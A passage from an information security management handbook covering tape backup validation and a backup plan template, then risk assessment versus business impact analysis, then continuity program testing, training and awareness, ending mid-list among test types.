backed up to tape.
Are the database schemas backed up with the database data or separately?
◾
◾
How do users backup their assigned desktop or laptop systems?
◾
◾
The enterprise has defined these topics according to standards, practices, guide-
lines, and procedures, but how does the enterprise validate that the backup tapes 
are still valid? If the enterprise has a business continuity and disaster recovery plan, 
then the backup tapes are tested on a regular basis. But what happens if the enter-
prise has not put the time, staff, and money into a business continuity and disaster 
recovery plan? The following are standards and procedures that can be put into 
place in the enterprise environment to validate that backup tapes contain valid and 
good information:
Ensure backups are successful and checked on a daily basis.
◾
◾
Document the criteria for a successful or failed back up. For example, if less 
◾
◾
than 20 files failed to back up on a full backup, then the backup is successful; 
if one database fails to back up on a full backup, then the backup has failed.
If incremental backups fail the first day, then do not rerun. If incremental back-
◾◾
ups fail two days in a row, then correct, rerun, and validate they are successful. If 
the weekly backups fail, then correct, rerun, and validate they are successful.
As backup tapes come back on site on a quarterly basis, perform a full system 
◾
◾
restore on a system or two that contains mission-critical data, such as a finan-
cial or payroll system.
Then as the enterprise develops the business continuity and disaster recovery 
plans, the enterprise will want to include these tips when performing a test or per-
forming a live disaster recovery:

Validating Tape Backups  ◾  307
Does the disaster recovery site have the hardware and software that matches 
◾
◾
the backups and backup tapes?
If the disaster recovery site has the tape hardware, does the enterprise disaster 
◾
◾
recovery plan contain a set of the tape backup software?
Does the disaster recovery plan include a copy of the procedures for system 
◾
◾
and information recovery?
Consider taking two sets of backup tapes to the event, just in case the pri-
◾
◾
mary set of tapes is corrupt.
Consider taking one set of tapes on one mode of transportation and a second 
◾
◾
set of tapes on another to the disaster recovery site.
Although many of these considerations are geared toward tape backups, the 
same considerations can also be used for other backup media. Table 22.1 represents 
a sample backup plan template.
If an enterprise cannot completely implement business continuity and disaster 
recovery plans, strong backup controls need be part of every enterprise environ-
ment. Without strong backup controls, an enterprise may not know that backups 
and backup media are good and can be used to recover operational data.

308  ◾  Information Security Management Handbook
Table 22.1  Sample Backup Plan Template
Purpose
The purpose of the backup plan is to establish and 
implement procedures to create and maintain retrievable 
exact copies of electronic information and related 
technology components that are necessary for recovery 
activities. This document will define the following 
standards for organization backup processing:
To provide a standard operating procedure for backup 
• 
of organization data
To provide a standard for labeling backup media
• 
To provide a standard for data retention
• 
To provide a standard for off-site storage and retrieval 
• 
of backup media
The data backup plan enables the organization to meet 
the availability requirements for regulatory compliance.
Table of Contents
CONFIDENTIALITY STATEMENT AND COMPLIANCE
PLAN MAINTENANCE (Change History)
INTRODUCTION
Purpose
Scope
Responsibilities
Data Backup Requirements
PROCEDURES
Backup Processing
Daily Incremental Backups
Weekly Full Backups
Monthly Full Backups
Quarter-End Full Backups
Failed Backups
Restoration Processing
Request for Restore
Authorization for Restore
Testing for Successful Restore
Failed Restoration

Validating Tape Backups  ◾  309
Table 22.1  Sample Backup Plan Template (Continued)
Backup Tape Testing
Quarterly
Regulatory
Regular Validations
Annual: Off-Site Contracts
Annual: Software Maintenance Renewals
Annual: Hardware Maintenance Renewals
Quarterly: Tape Access Authorizations
Quarterly: Tape Inventory
TAPES
Scheduling Backup Media Rotation
Sending Tapes Off Site
Recalling Tapes Back On Site
Tape Labeling
Retention Cycle
Tape Drive Cleaning
CONTACTS
Backup Software Supplier
Backup Hardware Supplier
Off-Site Storage Supplier
Authorized Staff to Recall and Send Tapes
APPENDIX (Forms/Logs/Schedules)
Tape Labeling Log
Data Backup Schedule
Backup Job Log
Tape Cleaning Log


8
BUSINESS 
CONTINUITY 
PLANNING AND 
DISASTER RECOVERY 
PLANNING


313
23
Chapter 
Determining Business 
Unit Priorities in Business 
Continuity Management
Kevin Henry
23.1  Introduction
The need for information security personnel to be involved in business continu-
ity management projects continues to grow as governments, shareholders, clients, 
suppliers, and community activist groups seek to ensure that each organization is 
prepared to deal with adverse events and mitigate potential losses to assets or social 
services. The main focus of traditional business continuity, from the perspective of 
Contents
23.1	 Introduction..............................................................................................313
23.2	 Risk Assessment versus Business Impact Analysis......................................314
23.3	 Risk Assessment........................................................................................314
23.3.1	New Technology “Use Cases”........................................................315
23.3.2	New Technology “Misuse Cases”...................................................315
23.3.4	The Ostrich....................................................................................316
23.3.5	Vulnerabilities................................................................................316
23.3.6	Information Security Solutions......................................................317
23.3.7	The People Risk.............................................................................318
23.4	 Business Impact Analysis..........................................................................319
23.5	 Summary..................................................................................................321

314  ◾  Information Security Management Handbook
the information security professional, was to ensure that data backups and disaster 
recovery plans were ready to facilitate the recovery of IT processing in the event of 
system failure. This model has become increasingly outdated as the role of IT in sup-
porting the organization has changed, and many business operations today could 
not function without the availability of IT systems, data, or controls. Information 
technology is not just “another department” in a modern organization. In most 
cases, it provides the lifeblood of communications, critical data, crucial alarm sig-
nals, and functionality that nearly every part of the business needs. Few depart-
ments can run without access to reliable and stable IT systems.
This means that the information security professional must recognize the impor-
tance of his or her role in business continuity management. It is extremely risky for 
an organization to overlook the need for a business continuity management project 
to start and end with a thorough understanding of the business. The information 
security specialist must become familiar with all the aspects of the business his or 
her systems or networks support, and the need to develop organizational resilience, 
network redundancy, and data backups correctly to ensure that any interruption to 
the business is of minimal duration and has as little impact as possible.
23.2  Risk Assessment versus Business Impact Analysis
The lines between risk assessment and business impact analysis are becoming 
increasingly blurred, and in many cases we see the terms being used interchange-
ably. This is not correct and may pose a risk to the organization through not under-
standing the important unique features of each process.
23.3  Risk Assessment
Risk assessment is a structured discipline that must discover the threats, vulnerabilities, 
and values of an organization’s assets. A key factor in risk assessment is the determina-
tion of the likelihood of an adverse event affecting an organization, process, or system. 
Risk assessment is a valuable tool to help the organization recognize its threat environ-
ment and ensure that the steps are undertaken to minimize the resulting risks to an 
acceptable level. The risk assessor must be able to envision all the potential threats to an 
organization. Often, the core risk evaluation is based on historical data. This may pro-
vide the assessor with factual data and a reasonable mechanism to predict future events. 
But such an approach is too narrow in scope and too easy a trap to fall into. The assessor 
must be at the cutting edge of technology and understand not only the errors or vul-
nerabilities of the past, but also the new threats that emerge from the adoption of new 
technology, increased reliance on IT systems, and the changing face of threat agents.
The assessor must see every technology with a critical eye and be able to under-
stand both the correct use of the technology and how it could be leveraged to provide 

Determining Business Unit Priorities  ◾  315
benefits to the organization, as well as understanding the risks that could emerge 
if the technology is misused. The first instance is critical for all risk assessment 
personnel. These information security professionals, in their role as risk assessor, 
are to lead the organization through evaluation and adoption of new technologies, 
successful and secure deployment of the technology, and maintaining of a secure 
operating environment with the inclusion of the new technology. Technology has 
the benefit of providing an organization with an incredible competitive advantage 
when deployed effectively. This means that the information security professional 
must deviate from the traditional approach of resisting the adoption of new or 
dangerous technology and merely playing the role of a hindrance to change, and 
instead embrace the culture of change that is a fact of daily life. The professional 
must therefore be prepared to evaluate and secure a new technology as well as to 
deploy the technology in a safe and stable manner.
23.3.1  New Technology “Use Cases”
When it is evident that a new technology is available that may provide an advantage 
to an organization, it is the responsibility of the professional to examine the tech-
nology carefully and seek out the correct manner of deployment including configu-
ration, maintenance, use, and procedural controls. The specialist must determine 
and document what critical services the technology is going to provide. Once this 
has been determined, the specialist can consider all the aspects of secure implemen-
tation based on the risk to the use of that technology. For example, a fax machine 
may not be seen as a large risk in itself nor to present significant value to the orga-
nization. In effect, it is of trivial cost and in most cases insignificant risk. However, 
when the specialist evaluates the purpose of the fax machine and the role it plays in 
supporting a critical business process, it may become apparent that the value of that 
device far outweighs its purchase price. This is comparable to a Formula One race 
being lost because of the failure of a bolt costing a few euros. The specialist would 
have been amiss in not understanding that the value of a device is not contained 
within the device itself, but rather in its placement as a part of a system and the 
critical service it provided to the system as a whole.
We can describe this approach to value determination as a ”use case.” The value 
depends on the use of the technology, not just the value of the device itself. If it 
supports a critical process, the value of the device often is reflective of the value of 
the entire process. When the correct value of the asset is identified, this enables 
the correct choice of mitigation strategy. A device that may cause an entire critical 
operation to fail must be considered for redundancy and failover.
23.3.2  New Technology “Misuse Cases”
The abovementioned scenario is the common approach used in determining asset 
value; however, a thorough assessment would be incomplete if it did not also include 

316  ◾  Information Security Management Handbook
the assessment of the risks posed to the organization through “misuse” cases as 
well. The abovementioned scenario determines the value, depending on the correct 
use of the technology and the risk of failure, but misuse cases are the more sinister 
approach to the valuation of a process, technology, or operation based on the abil-
ity of a threat agent to misuse the system for some purpose for which it was never 
intended. This is the negative approach to risk assessment that comes naturally 
to the threat agents, but may not be considered by a naïve and innocent security 
professional. The technology that provided such a benefit to the organization may 
also present a tremendous risk to the organization if misused. An example of this is 
the use of mobile phones and entertainment devices, which can hold a tremendous 
amount of music or other data in memory, being used inconspicuously to carry 
confidential corporate data; or the fax machine line from the previous example 
being used to connect an unauthorized modem inside the perimeter of the organi-
zation. The security specialists must now put on their black hats and explore how a 
system or technology that was intended for one positive purpose may be subverted 
for use in an unexpected and improper manner.
23.3.4  The Ostrich
The typical reaction to adverse conditions is to overreact and just cut off any activ-
ity related to the situation, like a person who is criticized for talking too long in 
a group discussion refusing to speak up again. If life were only so easy! We must 
be prepared for adverse conditions. An excerpt from the Information Assurance 
Technical Framework is very relevant here. It states in chapter two that “all systems 
must be built with the expectation of being attacked!” So does that mean that we 
should not develop any new systems because they will be attacked anyway? Of 
course not. Legend has it that the ostrich responds to a threat by hiding its head in 
the sand and pretending that something it cannot see, does not exist. We are not 
to demonstrate such an attitude when faced with adversity and risk. We are risk 
“managers” and, as such, must manage risk, not ignore it. Risk presents opportu-
nity, potential, and profit to an organization if managed properly. The organization 
that embraces a technology despite the risks, but monitors the systems in a careful 
manner, may find itself with a significant advantage over more cautious competi-
tors. Risk is to be identified, acknowledged, and confronted in a professional and 
cautious manner.
23.3.5  Vulnerabilities
It is often easier to see the enemy than it is to acknowledge our own weaknesses. A 
threat is only a threat; it does not really pose a risk to us unless we provide the mech-
anism through which the threat can affect us. Traditionally, this is referred to as a 
vulnerability. Although the threat is often something outside of ourselves, and often 
outside the organization, the vulnerability is the internal gap in our watchfulness, 

Determining Business Unit Priorities  ◾  317
control, technology, or procedures that opens the opportunity for the threat to hurt 
us. A stand-alone computer is not subject to network-based threats. There is no way 
that a computer that has no network connectivity could suddenly become a victim 
of a network-based attack, no matter how sinister, powerful, or devious the threat 
is. What is the problem then? Far too often, the assessment of the risk depends on 
the ability of the assessor to see the vulnerabilities as they really are. Ignorance of 
a vulnerability is no insurance against attack, but in many cases the due diligence 
aspect of risk management has been overlooked. The organization may take comfort 
in the existence of policies and other controls, not realizing that most of those con-
trols are “imaginary” because no one adheres to the policy and the other controls are 
disabled or not functioning as expected. Due diligence is the critical aspect of infor-
mation security that assesses all controls to see whether or not they are implemented 
correctly, working as intended, and producing the desired results. This examina-
tion of the true condition of internal processes, controls, and culture is critical to 
the correct assessment of the risk equation. An organization should never blame a 
security breach on outside factors. External factors can rarely be controlled, and it 
is the obligation of the organization to implement the controls and exercise the due 
diligence required to protect itself from those external threats. In some cases, it may 
be that the cost of mitigating a risk is greater than the benefit, and the organization 
may choose to suffer a breach rather than try to prevent the incident.
23.3.6  Information Security Solutions
Information security management is built by bringing several elements together 
into a complete solution. These elements are often called technical, management, 
and physical controls. A control is a mechanism that places a limitation or restraint 
on behavior. For example, a firewall is a technical control that limits the types of 
traffic that may pass across a network. However, in itself, a firewall is incomplete 
unless it is considered within its context. A firewall must be properly installed, 
maintained, reviewed, and monitored to reduce effectively the risk that it was 
installed to address. There should always be a close relationship between risk and 
control. A control must be considered for each significant risk, and a control should 
not be used where there is no justification for it or risk that it is designed to avert.
So when we evaluate risk, we must not blindly accept that a control is effective 
or accomplishing what it was intended to do. When risk is evaluated, the extent of 
the risk must be determined, and then the effectiveness of the controls is measured 
against the risk. Because few controls will ever completely eliminate a risk, it is 
important to know the level of risk that remains even after the controls are applied. 
This is usually referred to as residual risk. The challenge for the risk manager is to 
reduce the residual level of risk to one that can be accepted by the organization. 
This residual may or may not be the same as the accepted risk.
But how can we accurately measure the effectiveness of a control? Because we 
are often dealing with probabilities and chance, it is hard to know whether our 

318  ◾  Information Security Management Handbook
controls really reduced our risks or whether we have just been lucky enough to 
have missed the latest problems. Of course, the main element of accurately measur-
ing the effectiveness of a control is to look at all its elements: the technology and 
how strong, reliable, or restrictive the technology itself is. However, it is frequently 
overlooked to see the technology in its context. The risk manager must also look at 
the processes and operations that surround the technology, maintenance, change 
control, business reliance, reporting, and training used in deploying the technology 
correctly. What use would a firewall be if it was not maintained by personnel that 
have adequate training, incident reporting processes, or responsibility to ensure it 
is operating correctly?
A technology is subject to its physical environment. Without proper protec-
tion from theft, humidity, electrical surges/failure, or tampering, most technologies 
would be subject to unreliable performance or inconsistent results.
When evaluating any risk, it is therefore critical to ensure that all elements of the 
risk, the value, use, misuse, physical, and management controls are documented.
23.3.7  The People Risk
For many years, we have conveniently seen the blame for most security incidents 
laid at the feet of the users. It can often be felt that this is the insurmountable 
challenge—the Gordian knot of information security—the tangled problem that 
has no cure and no solution. This is all too often correct, and we can also say that 
most security lapses are due to the misbehavior or errors of personnel. This risk area 
must be addressed thoroughly.
Some of the primary problems with people are a lack of understanding or train-
ing. Bad events are things that happen to others, and security threats are not fixable 
anyway, so why worry about them when the pressure is on to perform faster, and tak-
ing shortcuts may improve productivity? This is a crucial part of risk management. 
People are important; every single one of the them may accidently or intentionally 
cause considerable damage to systems, reputation, or data. A poorly chosen word in a 
public area may cause a loss of reputation and customer confidence, and a paper that 
is discarded instead of being shredded may place an organization on the front page of 
the news reports. So a huge part of risk management is training and awareness.
The other element of people, though, is to see the critical role they play in 
achieving the mission of the organization. The business cannot run without them. 
Therefore, a major part of determining business unit priorities must be to identify 
the roles and responsibilities of people. Which job functions and operations are 
critical to meeting the mission of the organization? Which people are critical to 
operations of those functions?
This is especially relevant as we prepare for a disaster that may impact the avail-
ability of people. A pandemic, for example, would almost certainly result in the 
loss of available staff. Can the business run without people? Can we operate on a 

Determining Business Unit Priorities  ◾  319
reduced staff? Can people work from home? Do we have the network capability to 
permit large numbers of employees to work remotely?
These are some critical “people” issues. The risk manager will identify key peo-
ple, and also key roles and the people who can fill those roles. The manager must 
ensure that there is documentation to support those roles, cross-training so that 
others can step into a critical role that requires another resource, and a succession 
plan and authority structure that can operate in a crisis environment.
23.4  Business Impact Analysis
Until now we have investigated the world of risk assessment, but the next phase is 
to assess the impact that an adverse event would have on the organization over time. 
This is often done by looking at the development of the incident and how the level 
of impact would change as duration of the incident lengthens.
Business impact analysis (BIA) is often poorly done in an organization. The 
Disaster Recovery Journal/Forrester Research study of 2007 indicated that 87 per-
cent of companies felt that the need to improve disaster recovery plans was either 
critical or very critical. In many cases, we find that management, especially senior 
management, has little or no confidence in the organization’s current business con-
tinuity plans. This means that those managers will not trust those plans in a crisis 
and will often resort to hasty responses to an incident without following the plan or 
accessing the details and all the data already gathered into the plan.
Why is this? What makes BIA such a dismal failure?
The first step in building an infrastructure must be to design and map out the 
boundaries of the project. In some cases, this may be as large as the entire enter-
prise and even include an in-depth review of the supporting functions. In other 
cases, an organization may want a review limited to a single process or department. 
The NIST SP 800-30 outlines a good method of risk management and analysis. 
Because the BIA should be closely aligned with the risk analysis effort, the avail-
ability of documentation that is being used in the risk management effort can save 
the BIA project a considerable amount of time and repeated effort.
The first step outlined in SP 800-30 is “system characterization.” The very title 
describes colorfully the intent and benefits of this step. What are the characteristics 
of the system we are looking at? What are the inputs, processes, and outputs? Is the 
system itself critical to mission objectives or sensitive to modification? Does the 
system handle, transmit, or store confidential or classified data? All of these things 
must be understood before proceeding further.
It can be said that the most work involved in analysis is “data gathering.” True 
analysis itself is based on evidence, observation, testing, and research. The more data 
that can be provided for the analysis, the more accurate the analysis is likely to be. Just 
like statistics, the sample size will influence the precision of the statistical effort.

320  ◾  Information Security Management Handbook
The next phases of SP 800-30 review the environment the system operates 
in—its threats, vulnerabilities, the motivation of the threat agents, the known or 
planned controls—and brings all of those into a risk assessment report. In BIA, 
the focus is slightly significantly different from pure risk analysis. An effective BIA 
must consider more of the time element and the impact of an incident outage over 
time. This is not usually as prevalent in pure risk analysis. Also, the BIA must 
be aligned from a business mission perspective; in other words, “what would the 
impact of an adverse event outage be on the mission of the organization?”
It is at this point that we come to the heart of BIA. Most of the text until 
now has been done more or less effectively by many organizations, risk assessment 
teams, and business continuity planners. But it is at this point that many projects 
fail to reach their true potential or provide the confidence to senior management 
that they should.
It is wise to think of the environment of business continuity planning. In most 
cases, business continuity projects are performed by companies that realize a level of 
risk to their operations and want to be prepared to address those events. The intent is 
to recognize potential problems and then have the controls in place to prevent prob-
lems, limit the impact of an event, and facilitate a return to normal operations. The 
challenge is to understand the true impact of an event and how that impact would 
affect the organization. Organizations are complex organisms made up of many varied 
parts. Some parts are more visible; others may play a very critical role, but are much less 
apparent. Just like the human body, the outer pieces need the function of the inner ele-
ments to operate. What is most important? What functions are most critical? Which 
ones are critical in seconds? Which would not become critical for hours or even days?
The challenge of business continuity planning is that it can be difficult to peel 
back the layers of the organization to discover the hidden elements. It can be seen 
as fear mongering and a waste of time by many managers who are more concerned 
with deadlines and immediate issues than they are interested in taking the time or 
expending the resources needed to do a thorough review of their operations for some-
thing that may never happen anyway. Just like the human body, though, there are 
times when it is wise to address future problems through proactive measures today.
What can be accomplished through business continuity planning? Business 
continuity planning is an objective review, analysis, and evaluation of all the 
aspects of the organization. In the end, some elements will be found to be less criti-
cal than others, some are only critical after a time period, and some will be found 
to be ineffective, inefficient, or unnecessary. This is one of the greatest short-term 
advantages realized by an organization that undergoes a strong business continu-
ity planning effort. In many cases, risk management, business continuity plan-
ning, internal or external audit, and business process re-engineering are similar 
disciplines. The underlying effect is that once a thorough analysis is undertaken of 
the business operations or processes, considerable savings and advantages may be 
realized through the streamlining of some processes, the elimination of unneeded 

Determining Business Unit Priorities  ◾  321
redundancies (some redundancies are critical and must be preserved), and the doc-
umented review of the entire business and how it functions.
Back to BIA. How can a BIA effort contribute to the goals and benefits we have 
just described? Business impact analysis is the most important step in business con-
tinuity planning. Business impact analysis demonstrates the understanding of the 
business. It investigates the role of data, individuals, and networks and how those 
functions interact. It explores the intricacies of supply chains, and documents the 
politics of sales, clients, and consumers. Are the clients of the organization more 
susceptible to delays, price, or quality?
Business impact analysis is not just documenting how something works. It is 
not just about setting up contingency plans and system and data recovery. Those 
are important, but in a crisis the senior management team is more interested in the 
protection of the assets of the organization, the accomplishment of mission, and the 
method of recovery to normal than they are in data, systems, and networks that may 
or may not be critical. Business impact analysis is not about technology; it is about 
supporting the mission of the organization. What does this organization need in order 
to survive, make a profit, earn the confidence of customers, avoid bad publicity?
Business impact analysis is really a companion of business process re-engineer-
ing: it is the process of looking intently at the business as an entire organism, and 
understanding process flows, objectives, and outputs. Once the true business fac-
tors have been understood, then it is possible to evaluate properly the impact of a 
failure and develop resilience strategies, redundancies, incident response programs, 
and recovery programs that will ensure the key assets of the organization and the 
interests of the shareholders are preserved.
23.5  Summary
This chapter is a short review of business impact analysis, risk management, and the 
overall scope of business continuity management. Of course, much more must be 
understood before the organization can be assured it is ready for the many threats 
that it faces today. One thing that each organization must remember is that any 
failure or stumble by the organization may present a great advantage to competitors 
to seize the initiative and confidence of customers, and may result in unforeseen 
failures and market share loss.


323
24
Chapter 
Continuity Program 
Testing, Maintenance, 
Training, and Awareness
Carl Jackson
Contents
24.1	 Introduction..............................................................................................324
24.2	 The Foundation: The Business Continuity Planning Process.....................324
24.2.1	IT Continuity Planning.................................................................325
24.2.2	Business Process Resumption Planning (BRP)...............................325
24.2.3	Crisis Management Planning (CMP).............................................325
24.3	 Next Steps.................................................................................................326
24.3.1	Awareness/Training.......................................................................326
24.3.2	Testing/Maintenance.....................................................................327
24.3.3	Linchpin of Success: Continuity Planning Awareness and 
Training.........................................................................................327
24.3.3.1	Designing the Program....................................................327
24.3.3.2	Delivering the Message....................................................328
24.4	 Continuity Program Testing.....................................................................328
24.4.1	Why Test?......................................................................................328
24.4.2	Developing Test Strategies.............................................................328
24.4.3	Types of Tests................................................................................329
24.4.4	Budgeting for Tests........................................................................330

324  ◾  Information Security Management Handbook
24.1  Introduction
People are what make the continuity plans of an organization work. Knowledgeable, 
experienced, and practiced individuals are vital to any enterprise effort to react to 
and recover from a serious incident that impacts the organization’s ability to support 
time-critical business processes. Unfortunately, far too many otherwise competent 
managers place too much emphasis on the tools and deliverables or the business 
continuity process rather than focusing on the real success factors in measuring the 
organization’s ability to recover: the people.
With these thoughts in mind, the purpose of this chapter is to focus readers 
on those aspects of the business continuity planning program where the “rubber 
really hits the road.” And that is in ensuring that, once developed, crisis manage-
ment and business continuity plans are appropriately tested and maintained, and 
even more importantly, that the organization’s people receive the proper training 
and practice.
24.2  The Foundation: The Business 
Continuity Planning Process
To have an appreciation for the most efficient and effective components for conti-
nuity planning awareness, training, testing, and maintenance, it is helpful to have 
a broader understanding of where these essential elements fit within an overall 
continuity planning implementation.
Over the past decade, the vast majority of major enterprise business continuity 
planning implementations have shifted away from the once-traditional IT-focused 
disaster recovery-centric programs. Today, an enterprisewide continuity planning 
program is typically composed of three primary sub-processes: business process 
continuity planning, IT continuity plans, and crisis management plans. To be most 
effective, these three related continuity planning sub-processes should be closely 
linked and synchronized across the enterprise to ensure cross-discipline coordina-
tion for all development, implementation, testing, and maintenance undertakings. 
Figure 24.1 provides a graphical representation of how the enterprisewide continu-
ity planning process framework might appear.
24.5	 Investment Protection: Continuity Planning Maintenance.......................330
24.5.1	Developing Continuity Planning Maintenance Strategies..............331
24.5.2	Continuity Planning Software Solutions Will Enhance 
Testing/Maintenance.....................................................................332
24.5.4	Complementary Component: Metrics...........................................333
24.5.5	Awareness/Training Metrics..........................................................333
24.5.6	Testing/Maintenance Metrics........................................................333
24.6	 Summary..................................................................................................334

Continuity Program Testing, Maintenance, Training, and Awareness  ◾  325
This multi sub-process approach to continuity planning consolidates three tra-
ditional continuity-planning disciplines, as discussed in the following sections.
24.2.1  IT Continuity Planning
Once referred to as disaster recovery planning (DRP), IT continuity planning 
addresses all things technological. This includes all types of IT technologies, voice 
and data communications, and any other automated support resources that the 
organization relies upon to support time-critical business process operations.
24.2.2  Business Process Resumption Planning (BRP)
Business process continuity disciplines address the continuity and recovery require-
ments of an organization’s business processes (i.e., accounting, purchasing, sales, 
patient care, customer call center operations, etc.) should they lose access to or sup-
port of their infrastructure resources (i.e., IT, communications networks, facilities, key 
business partner support, etc.). The primary goal here is to understand the time-critical 
nature of each of the enterprise’s business processes and their support components, and 
to prioritize those processes with the most time-critical needs for access to resources.
24.2.3  Crisis Management Planning (CMP)
Crisis management planning documents the activities and tasks necessary for overall 
coordination of an organization’s response to a crisis in an effective and timely manner, 
Business Process/Function/Unit
Recovery Planning and
Execution Teams
Global Enterprise Emergency
and Recovery Response
Team(s)
Crisis
Management
Planning (CMP)
Technology Infrastructure
Recovery Planning and
Execution Teams
Figure 24.1  A graphical representation of how the enterprisewide business con-
tinuity planning process model might appear.

326  ◾  Information Security Management Handbook
with the goal of avoiding or minimizing damage to the organization’s profitability, 
reputation, or ability to operate. It is the crisis management process that provides 
the glue that holds the organization’s business continuity planning process together. 
Crisis management planning focuses on the development of effective and efficient 
enterprisewide emergency/disaster response capabilities. A top-down approach to cri-
sis management ensures that open lines of communication are maintained among 
executive management, the business process, and IT continuity teams, and with 
critical external entities (regulatory agencies, key business partners, customers, civil 
authorities, financial markets, etc.). This capability has three broad objectives:
	
1.	The first is to provide the executive management group with a predefined orga-
nizational structure and the wherewithal to facilitate communication with con-
tinuity planning teams of the affected business units and their processes.
	
2.	It also must be able to facilitate communication not only with the business 
units, but also among the various components of the continuity planning 
infrastructure, one to another (i.e., the IT continuity planning teams and the 
business process continuity teams).
	
3.	The crisis management plan also addresses the issues associated with outsider 
communication. It aids management in effective communication with out-
siders, such as civil authorities, key business partners, employees’ families, 
regulatory agencies, audit entities, shareholder groups, the press, etc. This 
response capability includes forming appropriate management teams and 
preparing the members to react to serious disruptive emergency situations 
(i.e., hurricane, earthquake, flood, fire, kidnapping, systems outages caused 
by serious hacker or virus damage, pandemic, etc.).
24.3  Next Steps
Once this type of overall business continuity planning process is in place, the goal 
of management must be to ensure that it is tested and maintained properly, and 
that the organization’s people are in position to execute the plans as designed.
24.3.1  Awareness/Training
A key component—awareness and training issues—are paramount to the success 
of any continuity planning program. At the end of the day, it is the organization’s 
people who will have to recover the enterprise following a disaster or disruption, so 
it only makes sense that those same people are intimately involved in the develop-
ment, implementation, testing, and maintenance of the program. Once the plans 
are developed by key personnel, however, it does not release these same people of 
further responsibilities. It is, therefore, critically important that a regular and ongo-
ing program of continuity planning awareness and training be put into place.

Continuity Program Testing, Maintenance, Training, and Awareness  ◾  327
24.3.2  Testing/Maintenance
Short- and long-term approaches to testing and maintenance should be formally 
defined and socialized with management, audit, and other interested parties to 
ensure that initial investments in the crisis and continuity planning program 
components are warranted and are sustained. Once documented, management 
must execute against these goals, monitoring and publishing results to provide a 
basis for measuring success and also to demonstrate empirically that the organiza-
tion can truly recover. A significant benefit of regular and ongoing testing is that 
the hands-on practice the people of the organization receive increases both their 
awareness and their efficiencies in execution of the plans when required. Let’s 
break these two broad categories of responsibility down even further and deal with 
each accordingly.
24.3.3  Linchpin of Success: Continuity 
Planning Awareness and Training
The continuity planning function must be much more people focused than techni-
cally focused.
The question should be asked, “Why are training, awareness, and education 
so important?” The answer: because it is the organization’s people who know the 
business processes, who must document the plan recovery processes, who will test 
and maintain the plans, and who will be impacted by the event, and it is these same 
people who will have to recover the organization following the disaster.
Therefore, of overriding importance is a high level of awareness and under-
standing of continuity planning program components on behalf of the people who 
will be called upon to execute them. Although there is no question that continuity 
plan documentation is important, it must be recognized that, at the end of the day, 
it is the people of the enterprise who must have the knowledge and skills necessary 
to facilitate successful recovery efforts.
24.3.3.1  Designing the Program
The awareness and training program has to contain components specifically designed 
to enhance the skills required to develop, implement, maintain, and execute crisis 
and continuity plans. Toward this end, the continuity planner, in conjunction with 
other organizational disciplines, such as human resources, professional develop-
ment, and risk management groups for instance, should establish training and 
awareness program objectives, define practical training requirements, develop a 
training method or approach, design and develop training aids, then schedule and 
conduct training sessions. In addition, the continuity planner should investigate 
and supplement, if appropriate, outside training opportunities that will enhance 
and broaden the scope and approach to internal training program components.

328  ◾  Information Security Management Handbook
24.3.3.2  Delivering the Message
Unfortunately when it comes to awareness and training efforts, one size does not fit 
all. Various groups of folks within the confines of the organization’s structure will 
need to have training and awareness messages customized to their levels or points 
of view. The approach to designing and delivering training and awareness program 
components to executive managers is far different than doing the same for manu-
facturing floor personnel, out of office sales staff, or customer service personnel. 
Identification and stratification of several different constituency groups within the 
enterprise will assist the continuity planner in developing awareness and training 
program components that will fit the audience, the importance of which should 
not be overlooked.
24.4  Continuity Program Testing
Crisis and continuity plan testing is not optional. Enterprise management cannot 
assert that they have an effective continuity planning program unless they can 
empirically demonstrate that that process has undergone regular and successful 
testing. A program of regular and ongoing testing helps to address a number of 
questions that arise pertaining to continuity planning effectiveness.
24.4.1  Why Test?
There are many reasons; for instance:
To demonstrate that recovery strategies and continuity plans actually work 
◾
◾
as designed.
To serve as a personnel awareness and training tool. Tests usually place the 
◾
◾
participants in a role-playing situation. By thinking and reacting during the 
test, they mentally place themselves in a recovery situation and gain an aware-
ness and understanding of what it will take to help the enterprise survive.
To supplement the maintenance process. In other words, a test is used as a 
◾
◾
motivator or incentive to maintain the crisis and continuity plans.
To demonstrate that recovery capabilities (i.e., off-site recovery systems, net-
◾
◾
works, vendors, etc.) are sized appropriately and operate as intended.
To satisfy regulatory or audit attestation requirements.
◾
◾
24.4.2  Developing Test Strategies
The continuity planner must develop and document both short- and long-term 
testing strategies. Continuity program testing strategies have to include require-
ments, set forth in advance for:

Continuity Program Testing, Maintenance, Training, and Awareness  ◾  329
Pre-test planning
◾
◾
Criteria for evaluation of test plans
◾
◾
What constitutes testing oversight
◾
◾
Test documentation requirements
◾
◾
Overall test evaluation criteria and oversight requirements
◾
◾
Test follow-up and debrief processes, including continuity plan updates and 
◾
◾
management reporting
24.4.3  Types of Tests
An organization can undertake a number of different types of testing:
Checklist testing: A checklist test is one in which the continuity planner or 
◾
◾
members of the continuity team (or both) validate the inventory checklists in 
their continuity plans by physically walking through the checklist and verify-
ing that each of the inventory items is available and viable. These inventory 
items include hardware, software, telecommunications, people, equipment, 
documentation, data, space, transportation, procedures, etc.
Tabletop walk-through testing: A tabletop walk-through test consists of con-
◾
◾
vening the members of the recovery/continuity team named in each specific 
continuity planning document to achieve the following objectives:
The first objective is for the team members to study and discuss all aspects 
−
−
of the planning document or output thoroughly and to challenge every 
assertion, assumption, activity, task, action, etc., called for within the 
plan. This challenge involves open discussions about the practicality, cor-
rectness, viability, and suitability of every aspect of the plan. Continuity 
team members should be encouraged to question openly any aspect of the 
planning strategies, etc., to work through areas of the plan that may well 
need to be changed.
The second purpose for a tabletop walk-through is to serve as a train-
−
−
ing and awareness tool. It is intended to help the continuity planner to 
familiarize the continuity team members with their specific roles and 
responsibilities, and to begin to indoctrinate them into thinking like a 
continuity team. It serves as a practice event that allows the team mem-
bers to participate and begin to get comfortable with acting in a continu-
ity team environment.
Simulation testing: A simulation test is one where the organization actually 
◾
◾
conducts some level of simulation of an emergency/disaster event. The breadth 
and scope of this type of simulation exercise can vary significantly from a very 
small localized departmental simulation to an all-out enterprisewide simula-
tion, and all events in between.
Parallel testing: A parallel test is often used in a transaction-oriented business 
◾◾
environment supported by IT. An organization may decide to retrieve yesterday’s 

330  ◾  Information Security Management Handbook
backup data and apply today’s transactions against that data in a parallel way 
to compare the results to today’s actual processing files to ensure that they are 
exactly alike. This process will highlight any faults in the data reconstruction 
process. A parallel testing approach can also be used to run a time-critical appli-
cation/system at an alternate site and compare the results to that run at the 
primary site to ensure that the alternate site produces accurate results.
Full interruption testing: Not usually recommended as an appropriate testing 
◾◾
approach because it requires interruption of actual production activities on a real-
time basis, a full interruption test is an all-encompassing continuity planning test. 
